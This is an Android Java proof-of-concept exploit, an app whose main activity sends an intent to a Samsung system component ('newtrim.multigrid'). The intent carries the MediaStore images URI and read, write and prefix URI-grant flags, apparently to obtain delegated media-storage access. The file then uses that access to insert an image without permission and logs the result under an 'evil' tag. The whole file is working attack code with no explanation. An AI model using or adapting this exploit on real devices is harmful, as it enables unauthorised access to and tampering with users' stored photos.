package poc.app;

import android.app.Activity;
import android.content.ClipData;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.app.newtrim.multigrid");
        i.setClipData(ClipData.newRawUri("", MediaStore.Images.Media.EXTERNAL_CONTENT_URI));
        i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
        startActivityForResult(i, 0);
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
                Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),
                "Title_1337",
                "Description_1337");
        Log.d("evil", "Result: " + uri);
    }
}